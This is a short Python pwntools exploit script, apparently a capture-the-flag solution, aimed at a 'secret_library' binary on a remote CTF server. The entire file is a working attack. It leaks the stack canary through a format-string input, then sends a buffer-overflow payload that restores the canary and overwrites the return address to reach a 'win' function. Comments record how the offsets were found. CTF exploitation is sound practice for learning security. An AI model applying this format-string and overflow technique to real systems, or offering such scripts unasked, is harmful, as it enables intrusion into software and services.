#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./secret_library", checksec=False)

p = remote("offsec.m0lecon.it", 13523)

# Your exploit here

#found by printing %p... as first input (value with last byte to 0)
CANARY_IDX = 23
#python3 -c "from pwn import *; print(cyclic(200)) as input + debug tofind canary offset
OFFSET_TO_CANARY = 136 
#rip offset is canary offset + canary (8B) + saved RPB (8B)
OFFSET_TO_RIP = 152


ret = 0x000000000040101a

p.recvuntil(b"guestbook: ")
p.sendline(f"%{CANARY_IDX}$lx".encode())
leak = p.recvline().strip().split()
canary = int(leak[1], 16)
log.info(f"canary = {canary:#x}")

p.recvuntil(b"review: ")
payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    ret,
    p64(elf.sym.win),
)
p.send(payload)

p.interactive()
